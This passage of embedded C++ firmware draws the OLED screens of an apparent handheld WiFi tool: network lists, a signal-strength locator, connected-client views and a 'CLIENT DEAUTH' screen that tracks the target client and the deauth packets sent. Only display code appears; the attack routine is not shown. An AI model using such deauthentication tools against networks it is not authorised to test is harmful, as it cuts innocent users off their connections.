    locateTargetChannel = 0;
  } else {
    currentIndex = constrain(currentIndex, 0, (int)wifiNetworks.size() - 1);
    listStartIndex =
        constrain(listStartIndex, 0, max(0, (int)wifiNetworks.size() - 5));
  }

  if (isDetailView && now - lastLocateUpdate >= locateUpdateInterval) {
    lastLocateUpdate = now;
    needsRedraw = true;
  }

  if (isLocateMode && now - lastLocateUpdate >= locateUpdateInterval) {
    lastLocateUpdate = now;
    needsRedraw = true;
  }

  if (isClientDeauthMode && now - lastLocateUpdate >= locateUpdateInterval) {
    lastLocateUpdate = now;
    needsRedraw = true;
  }

  if (!needsRedraw) {
    return;
  }

  needsRedraw = false;
  u8g2.clearBuffer();

  if (wifiNetworks.empty()) {
    u8g2.setFont(u8g2_font_6x10_tr);
    if (wifiscan_isScanning) {
      u8g2.drawStr(0, 10, "Scanning for");
      u8g2.drawStr(0, 20, "WiFi networks...");
      u8g2.setFont(u8g2_font_5x8_tr);
      u8g2.drawStr(0, 35, "Please wait...");
    } else {
      u8g2.drawStr(0, 10, "No networks found");
      u8g2.setFont(u8g2_font_5x8_tr);
      char timeStr[32];
      unsigned long timeLeft = (scanInterval - (now - lastAPScanTime)) / 1000;
      snprintf(timeStr, sizeof(timeStr), "Scanning in %lus", timeLeft);
      u8g2.drawStr(0, 30, timeStr);
    }
    u8g2.setFont(u8g2_font_5x8_tr);
    u8g2.drawStr(0, 62, "Press SEL to exit");
  } else if (isLocateMode) {
    auto &net = wifiNetworks[currentIndex];
    u8g2.setFont(u8g2_font_5x8_tr);
    char buf[32];

    char maskedSSID[33];
    maskName(net.ssid, maskedSSID, sizeof(maskedSSID) - 1);
    snprintf(buf, sizeof(buf), "%.13s Ch:%d", maskedSSID, locateTargetChannel);
    u8g2.drawStr(0, 8, buf);

    char maskedBSSID[18];
    maskMAC(net.bssid, maskedBSSID);
    snprintf(buf, sizeof(buf), "%s", maskedBSSID);
    u8g2.drawStr(0, 16, buf);

    u8g2.setFont(u8g2_font_7x13B_tr);
    snprintf(buf, sizeof(buf), "RSSI: %d dBm", net.rssi);
    u8g2.drawStr(0, 28, buf);

    u8g2.setFont(u8g2_font_5x8_tr);
    int rssiClamped = constrain(net.rssi, -100, -40);
    int signalLevel = map(rssiClamped, -100, -40, 0, 5);

    const char* quality;
    if (signalLevel >= 5) quality = "EXCELLENT";
    else if (signalLevel >= 4) quality = "VERY GOOD";
    else if (signalLevel >= 3) quality = "GOOD";
    else if (signalLevel >= 2) quality = "FAIR";
    else if (signalLevel >= 1) quality = "WEAK";
    else quality = "VERY WEAK";

    snprintf(buf, sizeof(buf), "Signal: %s", quality);
    u8g2.drawStr(0, 38, buf);

    int barWidth = 12;
    int barSpacing = 5;
    int totalWidth = (barWidth * 5) + (barSpacing * 4);
    int startX = (128 - totalWidth) / 2;
    int baseY = 54;

    for (int i = 0; i < 5; i++) {
      int barHeight = 8 + (i * 2);
      int x = startX + (i * (barWidth + barSpacing));
      int y = baseY - barHeight;

      if (i < signalLevel) {
        u8g2.drawBox(x, y, barWidth, barHeight);
      } else {
        u8g2.drawFrame(x, y, barWidth, barHeight);
      }
    }

    u8g2.drawStr(0, 62, "L=Back SEL=Exit");
  } else if (isClientDeauthMode) {
    auto &net = wifiNetworks[currentIndex];
    u8g2.setFont(u8g2_font_6x10_tr);
    char buf[40];

    u8g2.drawStr(0, 10, "CLIENT DEAUTH");
    u8g2.drawHLine(0, 12, 128);

    u8g2.setFont(u8g2_font_5x8_tr);
    char maskedClientMAC[18];
    maskMAC(deauthTargetClientMAC, maskedClientMAC);
    snprintf(buf, sizeof(buf), "Target: %s", maskedClientMAC);
    u8g2.drawStr(0, 22, buf);

    char maskedSSID[33];
    maskName(net.ssid[0] ? net.ssid : "Unknown", maskedSSID, sizeof(maskedSSID) - 1);
    snprintf(buf, sizeof(buf), "AP: %.12s", maskedSSID);
    u8g2.drawStr(0, 32, buf);

    snprintf(buf, sizeof(buf), "Channel: %d", deauthTargetChannel);
    u8g2.drawStr(0, 42, buf);

    snprintf(buf, sizeof(buf), "Packets: %lu", deauthPacketCount);
    u8g2.drawStr(0, 52, buf);

    u8g2.drawStr(0, 62, "L=Stop");
  } else if (isClientDetailView && isClientsView) {
    auto &net = wifiNetworks[currentIndex];
    if (currentClientIndex < (int)net.clients.size()) {
      auto &client = net.clients[currentClientIndex];
      u8g2.setFont(u8g2_font_5x8_tr);
      char buf[40];

      char maskedClientMAC[18];
      maskMAC(client.clientMAC, maskedClientMAC);
      snprintf(buf, sizeof(buf), "MAC: %s", maskedClientMAC);
      u8g2.drawStr(0, 8, buf);

      snprintf(buf, sizeof(buf), "RSSI: %d dBm  Pkts: %u", client.rssi, client.packetCount);
      u8g2.drawStr(0, 18, buf);

      unsigned long age = (now - client.lastSeen) / 1000;
      snprintf(buf, sizeof(buf), "Last seen: %lus ago", age);
      u8g2.drawStr(0, 28, buf);

      char statusStr[30] = "Status: ";
      if (client.frameTypes & FRAME_TYPE_DATA) {
          strcat(statusStr, "Active");
      } else if (client.frameTypes & FRAME_TYPE_ASSOC) {
          strcat(statusStr, "Associated");
      } else {
          strcat(statusStr, "Unknown");
      }
      u8g2.drawStr(0, 38, statusStr);

      u8g2.drawStr(0, 62, "L=Back R=Deauth");
    }
  } else if (isClientsView) {
    auto &net = wifiNetworks[currentIndex];
    u8g2.setFont(u8g2_font_5x8_tr);
    char buf[40];

    char maskedSSID[33];
    maskName(net.ssid[0] ? net.ssid : "Unknown", maskedSSID, sizeof(maskedSSID) - 1);
    snprintf(buf, sizeof(buf), "%.12s", maskedSSID);
    u8g2.drawStr(0, 8, buf);

    snprintf(buf, sizeof(buf), "Clients: %d/%d", net.clientCount, MAX_CLIENTS_PER_AP);
    u8g2.drawStr(0, 16, buf);

    u8g2.drawHLine(0, 18, 128);

    if (net.clients.empty()) {
      u8g2.drawStr(0, 30, "No clients detected");
      u8g2.drawStr(0, 62, "L=Back");
    } else {
      for (int i = 0; i < 3; ++i) {
        int clientIdx = clientListStartIndex + i;
        if (clientIdx >= (int)net.clients.size())
          break;

        auto &client = net.clients[clientIdx];
        int y = 28 + i * 12;

        if (clientIdx == currentClientIndex) {
          u8g2.drawStr(0, y, ">");
        }

        char maskedClientMAC[18];
        maskMAC(client.clientMAC, maskedClientMAC);
        u8g2.drawStr(8, y, maskedClientMAC);

        if (client.packetCount >= 1000) {
          float pkts = client.packetCount / 1000.0;
          snprintf(buf, sizeof(buf), "%.1fk", pkts);
        } else {
          snprintf(buf, sizeof(buf), "%u", client.packetCount);
        }
        u8g2.drawStr(100, y, buf);
      }

      u8g2.drawStr(0, 62, "L=Back U/D=Scroll R=Detail");
    }
  } else if (isDetailView) {
    auto &net = wifiNetworks[currentIndex];
    u8g2.setFont(u8g2_font_5x8_tr);
    char buf[40];

    char maskedSSID[33];
    maskName(net.ssid, maskedSSID, sizeof(maskedSSID) - 1);
    snprintf(buf, sizeof(buf), "SSID: %s", maskedSSID);
    u8g2.drawStr(0, 10, buf);

    char maskedBSSID[18];
    maskMAC(net.bssid, maskedBSSID);
    snprintf(buf, sizeof(buf), "BSSID: %s", maskedBSSID);
    u8g2.drawStr(0, 20, buf);

    snprintf(buf, sizeof(buf), "RSSI: %d dBm", net.rssi);
    u8g2.drawStr(0, 30, buf);

    snprintf(buf, sizeof(buf), "Ch: %d  Auth: %s", net.channel, net.authMode);
    u8g2.drawStr(0, 40, buf);

    snprintf(buf, sizeof(buf), "Age: %lus  Clients: %d", (now - net.lastSeen) / 1000, net.clientCount);
    u8g2.drawStr(0, 50, buf);

    u8g2.drawStr(0, 62, "L=Back D=Clients R=Locate");
  } else {
    u8g2.setFont(u8g2_font_6x10_tr);
    char header[32];
    snprintf(header, sizeof(header), "WiFi: %d/%d", (int)wifiNetworks.size(), MAX_NETWORKS);
    u8g2.drawStr(0, 10, header);

    for (int i = 0; i < 5; ++i) {
      int idx = listStartIndex + i;
      if (idx >= (int)wifiNetworks.size())
        break;
      auto &n = wifiNetworks[idx];
      if (idx == currentIndex)
        u8g2.drawStr(0, 20 + i * 10, ">");
      char line[32];
      char maskedSSID[33];
      maskName(n.ssid[0] ? n.ssid : "Unknown", maskedSSID, sizeof(maskedSSID) - 1);
      snprintf(line, sizeof(line), "%.8s | RSSI %d",
               maskedSSID, n.rssi);
      u8g2.drawStr(10, 20 + i * 10, line);
    }
  }
  u8g2.sendBuffer();
  displayMirrorSend(u8g2);
}